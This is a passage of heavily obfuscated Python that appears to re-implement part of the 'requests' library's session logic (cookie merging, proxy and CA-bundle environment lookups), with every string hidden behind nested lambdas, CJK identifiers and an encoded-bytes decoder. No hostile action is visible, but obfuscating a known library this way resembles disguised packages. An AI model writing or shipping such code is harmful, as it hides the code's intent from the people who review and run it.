樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0b'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\n'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0e'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0c'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0c'))()]))))())())()).cookies.merge_cookies(襺糰蚩瘢倓槓((lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0b'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\n'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0e'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0c'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0c'))()]))))())())()).cookies.merge_cookies(襺糰蚩瘢倓槓((lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0b'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\n'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0e'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0c'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0c'))()]))))())())()).cookies.RequestsCookieJar(), self.cookies), cookies), hooks=self.merge_hooks(req.hooks, self.hooks))
                send_kwargs = {(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x02'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x06'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0e'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))()]))))())())(): timeout, (lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfa'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x05'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x05'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x10'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xf8'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0b'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfd'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x02'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0b'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfc'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0c'))()]))))())())(): allow_redirects}
                url = prep.url
                stream = stream
                verify = verify
                cert = cert
                proxies = proxies or {}
                if self.trust_env:
                    no_proxy = proxies.get((lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xf8'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\t'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0b'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x11'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x12'))()]))))())())()) if proxies is not None else None
                    env_proxies = 襺糰蚩瘢倓槓((lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0b'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\n'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0e'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0c'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0c'))()]))))())())()).utils.get_environ_proxies(url, no_proxy=no_proxy)
                    for k, v in env_proxies.items():
                        proxies.setdefault(k, v)
                    if verify is (lambda: (lambda 钊葍扝迭靳饭: 钊葍扝迭靳饭 + (lambda: 趄诖狗谦頠鮳((lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'))()))())((lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/'))()) == (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x01'))())() or verify is None:
                        verify = 襺糰蚩瘢倓槓((lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0c'))()]))))())())()).environ.get((lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xeb'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xde'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xea'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xee'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xde'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xec'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xed'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xec'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xf8'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xdc'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xda'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xf8'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xdb'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xee'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xe7'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xdd'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xe5'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xde'))()]))))())())()) or 襺糰蚩瘢倓槓((lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0c'))()]))))())())()).environ.get((lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xdc'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xee'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xeb'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xe5'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xf8'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xdc'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xda'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xf8'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xdb'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xee'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xe7'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xdd'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xe5'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xde'))()]))))())())())
